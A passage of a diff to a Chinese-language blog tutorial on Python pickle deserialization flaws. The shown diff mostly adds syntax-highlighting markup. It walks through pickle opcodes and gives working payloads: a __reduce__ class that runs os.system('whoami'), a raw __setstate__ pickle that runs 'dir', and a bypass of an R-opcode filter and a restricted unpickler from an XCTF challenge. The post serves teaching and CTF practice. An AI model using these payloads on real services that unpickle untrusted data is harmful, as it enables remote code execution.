entity" title="\x00">\x00</span>textq<span class="token entity" title="\x04">\x04</span>X<span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\x80">\x80</span>q<span class="token entity" title="\x05">\x05</span>X<span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span>todeq<span class="token entity" title="\x06">\x06</span>]q<span class="token entity" title="\x07">\x07</span>(X<span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xa1">\xa1</span>q<span class="token entity" title="\x08">\x08</span>X<span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x97">\x97</span>q<span class="token entity" title="\t">\t</span>X<span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\xba">\xba</span>q<span class="token entity" title="\n">\n</span>eub.'</span>    
+    <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>
+    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'__main__ dairy'</span>
+   <span class="token number">18</span>: <span class="token punctuation">)</span>    EMPTY_TUPLE
+   <span class="token number">19</span>: <span class="token punctuation">\</span>x81 NEWOBJ
+   <span class="token number">20</span>: <span class="token punctuation">&#125;</span>    EMPTY_DICT
+   <span class="token number">21</span>: <span class="token punctuation">(</span>    MARK
+   <span class="token number">22</span>: X        BINUNICODE <span class="token string">'date'</span>
+   <span class="token number">31</span>: J        BININT     <span class="token number">20202020</span>
+   <span class="token number">36</span>: X        BINUNICODE <span class="token string">'text'</span>
+   <span class="token number">45</span>: X        BINUNICODE <span class="token string">'语言'</span>
+   <span class="token number">56</span>: X        BINUNICODE <span class="token string">'tode'</span>
+   <span class="token number">65</span>: <span class="token punctuation">]</span>        EMPTY_LIST
+   <span class="token number">66</span>: <span class="token punctuation">(</span>        MARK
+   <span class="token number">67</span>: X            BINUNICODE <span class="token string">'计'</span>
+   <span class="token number">75</span>: X            BINUNICODE <span class="token string">'算'</span>
+   <span class="token number">83</span>: X            BINUNICODE <span class="token string">'机'</span>
+   <span class="token number">91</span>: e            APPENDS    <span class="token punctuation">(</span>MARK at <span class="token number">66</span><span class="token punctuation">)</span>
+   <span class="token number">92</span>: u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">21</span><span class="token punctuation">)</span>
+   <span class="token number">93</span>: b    BUILD
+   <span class="token number">94</span>: <span class="token builtin class-name">.</span>    STOP
+highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre>
 
 <p>其中因为使用了<code>optimize</code>方法省略了<code>q  BINPUT   x</code>这一行汇编指令，这行指令的意思是把当前栈的栈顶复制一份，放进存储区，</p>
 <p>下面对优化后的代码一行一行的进行解释</p>
@@ -153,69 +153,69 @@ highest protocol among opcodes &#x3D; 2</code></pre>
 <li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li>
 </ul>
 <p>class的<code>__reduce__</code>方法在pickle反序列化的时候会被执行（类似php中的<code>__wakeup</code>），其底层的编码方法就是利用了R指令，f要么返回字符串，要么返回一个tuple，后者就可以进行利用，payload如下：</p>
-<pre class="language-python" data-language="python"><code class="language-python">import pickle
-import pickletools
-import os
-class dairy():
-    def __init__(self):
-        self.date &#x3D; 20202020
-        self.text &#x3D; &#39;语言&#39;
-        self.tode &#x3D; [&#39;计&#39;,&#39;算&#39;,&#39;机&#39;]
-    def __reduce__(self):                      #反序列化时执行，底层编码方法使用R指令码，
-        return (os.system,(&#39;whoami&#39;,))
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> pickletools
+<span class="token keyword">import</span> os
+<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>
+        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'语言'</span>
+        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'计'</span><span class="token punctuation">,</span><span class="token string">'算'</span><span class="token punctuation">,</span><span class="token string">'机'</span><span class="token punctuation">]</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                      <span class="token comment">#反序列化时执行，底层编码方法使用R指令码，</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-today &#x3D; dairy()
-#print(pickle.dumps(today))
-x &#x3D; pickle.dumps(today)
-x &#x3D; pickletools.optimize(x)  #优化，消除未使用的PUT
-pickletools.dis(x)           #反汇编一个已经打包的字符串，优化一个已经被打包的字符串</code></pre>
+today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment">#print(pickle.dumps(today))</span>
+x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>
+x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">#优化，消除未使用的PUT</span>
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>           <span class="token comment">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></code></pre>
 
 <p>得到以下结果</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;
-    0: \x80 PROTO      3
-    2: c    GLOBAL     &#39;nt system&#39;
-   13: X    BINUNICODE &#39;whoami&#39;
-   24: \x85 TUPLE1
-   25: R    REDUCE
-   26: .    STOP
-highest protocol among opcodes &#x3D; 2</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell">b<span class="token string">'<span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x03">\x03</span>cnt<span class="token entity" title="\n">\n</span>system<span class="token entity" title="\n">\n</span>q<span class="token entity" title="\x00">\x00</span>X<span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span>whoamiq<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x85">\x85</span>q<span class="token entity" title="\x02">\x02</span>Rq<span class="token entity" title="\x03">\x03</span>.'</span>
+    <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>
+    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'nt system'</span>
+   <span class="token number">13</span>: X    BINUNICODE <span class="token string">'whoami'</span>
+   <span class="token number">24</span>: <span class="token punctuation">\</span>x85 TUPLE1
+   <span class="token number">25</span>: R    REDUCE
+   <span class="token number">26</span>: <span class="token builtin class-name">.</span>    STOP
+highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre>
 
 <p>随后将序列化的内容反序列化</p>
-<pre class="language-python" data-language="python"><code class="language-python">b &#x3D; b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;
-hack &#x3D; pickle.loads(b)</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token string">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span>
+hack <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b<span class="token punctuation">)</span></code></pre>
 
 <p>随后就可得到命令执行的结果</p>
 <h4 id="c指令码"><a href="#c指令码" class="headerlink" title="c指令码"></a>c指令码</h4><p>先来看下面一段代码：</p>
-<pre class="language-python" data-language="python"><code class="language-python">import pickle
-import base64
-class student():
-    def __init__(self,name,grade):
-        self.name &#x3D; name
-        self.grade &#x3D; grade
-    def __eq__(self,other):     # 定义内置方法,当判断两个对象的值是否相等时，触发此方法
-        return type(other) is student and self.name &#x3D;&#x3D; other.name and self.grade &#x3D;&#x3D; other.grade
-        #is比较地址
-print(pickle.dumps(student(&#39;czj&#39;,&#39;extrader&#39;)))
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade
+    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># 定义内置方法,当判断两个对象的值是否相等时，触发此方法</span>
+        <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade
+        <span class="token comment">#is比较地址</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>student<span class="token punctuation">(</span><span class="token string">'czj'</span><span class="token punctuation">,</span><span class="token string">'extrader'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-import blue
+<span class="token keyword">import</span> blue
 
-def check(data):
-    if b&#39;R&#39; in data:
-        return &#39;no reduce!&#39;
-    x &#x3D; pickle.loads(data)
+<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>
+    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
 
-    if(x !&#x3D; student(blue.name,blue.grade)):
-        return &#39;Not equal &gt;_&lt;&#39;
-    return &#39;well done!&#39;
+    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>
+    <span class="token keyword">return</span> <span class="token string">'well done!'</span>
 
-try:
-    print(check(base64.b64decode(input())))
-except:
-    pass</code></pre>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span></code></pre>
 
 <p><code>blue.py</code>中：</p>
-<pre class="language-python" data-language="python"><code class="language-python">name &#x3D; &quot;A&quot;
-grade &#x3D; &quot;B&quot;</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>
+grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre>
 
 <p>以上代码过滤了<code>R</code>指令码，<code>check</code>方法中检测到<code>input</code>的<code>date</code>中含有<code>R</code>指令码就直接被返回<code>no reduce!</code>，函数给出了一个输入点，在将<code>input</code>的<code>data</code>参数反序列化后需要其中的name和grade和blue这个module中的name和grade相对应，也就是说我们需要利用序列化后的student类，来令其相等</p>
 <p>这里如果我们知道blue.py中参数的值的话，直接构造<code>name = &quot;A&quot;</code>，<code>grade = &quot;B&quot;</code>的payload即可，如下：</p>
@@ -228,49 +228,49 @@ grade &#x3D; &quot;B&quot;</code></pre>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt loading="lazy"></p>
 <p>可以清楚的看到c指令码替换成功，随后也成功的绕过了比较</p>
 <p>但如果c指令的<code>module</code>被限制了呢？c指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法，然而<code>find_class</code>可以被重写，如果c指令码只允许包含<code>__main__</code>这一个<code>module</code>，又该如何解决？代码如下</p>
-<pre class="language-python" data-language="python"><code class="language-python">import pickle
-import base64
-import pickletools
-import blue
-import io
-import sys
-class student():
-    def __init__(self,name,grade):
-        self.name &#x3D; name
-        self.grade &#x3D; grade
-    def __eq__(self,other):     
-        return type(other) is student and self.name &#x3D;&#x3D; other.name and self.grade &#x3D;&#x3D; other.grade
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> pickletools
+<span class="token keyword">import</span> blue
+<span class="token keyword">import</span> io
+<span class="token keyword">import</span> sys
+<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade
+    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>     
+        <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade
 
-class RestrictedUnpickler(pickle.Unpickler):
-    def find_class(self, module, name):
-        if module &#x3D;&#x3D; &#39;__main__&#39;:
-            return getattr(sys.modules[&#39;__main__&#39;], name)
-        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))
-        #通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。
-def restricted_loads(s):
-    return RestrictedUnpickler(io.BytesIO(s)).load()
+<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment">#通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。</span>
+<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-def check(data):
-    try:
-        if &#39;R&#39; in data:
-            return &#39;no reduce!&#39;
-        if type(restricted_loads(eval(data))) is not student:
-            return &quot;false!&quot;
-        x &#x3D; pickle.loads(eval(data))
-        if(x !&#x3D; student(blue.name,blue.grade)):
-            return &#39;Not equal &gt;_&lt;&#39;
-        return &#39;well done!&#39;
-    except:
-        return &quot;Something wrong&quot;
+<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>
+        <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>restricted_loads<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> student<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"false!"</span>
+        x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>
+        <span class="token keyword">return</span> <span class="token string">'well done!'</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Something wrong"</span>
 
-try:
-    print(check(base64.b64decode(input().encode(&quot;utf8&quot;)).decode(&quot;utf8&quot;)))
-except:
-    pass</code></pre>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span></code></pre>
 
 <p><code>blue.py</code>中：</p>
-<pre class="language-python" data-language="python"><code class="language-python">name &#x3D; &quot;A&quot;
-grade &#x3D; &quot;B&quot;</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>
+grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre>
 
 <p>题目部分来自XCTF高校战疫的一道题：webtmp</p>
 <p>这道题就将input的date的modules进行了判断，如果不是<code>__main__ student</code>则会引发错误然后退出，那该如何解决？</p>
@@ -284,7 +284,7 @@ grade &#x3D; &quot;B&quot;</code></pre>
 </ul>
 <p>由于栈顶是正常的<code>student</code>对象（<code>if</code>语句判断用过），<code>pickle.loads</code>会返回正常，于是到手的<code>student</code>对象<code>name</code>和<code>grade</code>都与<code>blue.name</code>、<code>blue.grade</code>对应了</p>
 <p><code>payload</code>如下：</p>
-<pre class="language-python" data-language="python"><code class="language-python">b&#39;\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.&#39;</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.'</span></code></pre>
 
 <p>其中q指令可省略</p>
 <p>把过程输出执行结果如下：</p>
@@ -292,26 +292,26 @@ grade &#x3D; &quot;B&quot;</code></pre>
 <p>可看到成功绕过了判断</p>
 <h4 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a>setstate</h4><p>如果<code>inst</code>有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code>里面</p>
 <p><code>__setstate__</code>与<code>__getstate__</code>的关系：<code>pickle</code>一个类的实例时，Python 将只 <code>pickle</code> 当它调用该实例的 <code>getstate()</code> 方法时返回给它的值。类似的，在 <code>unpickle</code> 时，Python 将提供经过 <code>unpickle</code> 的值作为参数传递给实例的 <code>setstate()</code> 方法。</p>
-<pre class="language-python" data-language="python"><code class="language-python">import pickle
-import pickletools
-class Foo():
-  def __init__(self):
-     self.val &#x3D; 2020
-  def __getstate__(self):
-     print(&quot;I&#39;m being pickled&quot;)
-     self.val *&#x3D; 2
-     return self.__dict__
-  def __setstate__(self, d):
-     print(&quot;I&#39;m being unpickled with these values:&#123;&#125;&quot;.format(d)) 
-     self.__dict__ &#x3D; d
-     self.val *&#x3D; 3
-f &#x3D; Foo()
-f_string &#x3D; pickle.dumps(f)
-print(f_string)
-a &#x3D; pickletools.optimize(f_string)
-pickletools.dis(a)
-f_new &#x3D; pickle.loads(f_string)
-print(&quot;&#123;&#125;&quot;.format(f_new.val))</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> pickletools
+<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>
+  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>
+     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>
+     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__
+  <span class="token keyword">def</span> <span class="token function">__setstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
+     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being unpickled with these values:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+     self<span class="token punctuation">.</span>__dict__ <span class="token operator">=</span> d
+     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">3</span>
+f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>
+f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
+a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
 
 <p>代码执行结果如下：</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt loading="lazy"></p>
@@ -320,32 +320,32 @@ print(&quot;&#123;&#125;&quot;.format(f_new.val))</code></pre>
 <p><code>os.system</code>，接下来再次利用<code>dir</code>来<code>BUILD</code>这个对象，就构成了<code>os.system(&#39;dir&#39;)</code>命令执行，实现了RCE</p>
 <p><code>payload</code>：<code>b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p>
 <p>有如下代码：</p>
-<pre class="language-python" data-language="python"><code class="language-python">import pickle
-import pickletools
-class Foo():
-  def __init__(self):
-     self.val &#x3D; 2020
-  def __getstate__(self):
-     print(&quot;I&#39;m being pickled&quot;)
-     self.val *&#x3D; 2
-     return self.__dict__
-f &#x3D; Foo()
-f_string &#x3D; pickle.dumps(f)
-print(f_string)
-a &#x3D; pickletools.optimize(f_string)
-pickletools.dis(a)
-f_new &#x3D; pickle.loads(f_string)
-print(&quot;&#123;&#125;&quot;.format(f_new.val))
-d &#x3D; b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;
-c &#x3D; pickletools.optimize(d)
-pickletools.dis(c)
-pickle.loads(c)</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> pickletools
+<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>
+  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>
+     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>
+     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__
+f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>
+f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
+a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> <span class="token string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.'</span>
+c <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>d<span class="token punctuation">)</span>
+pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
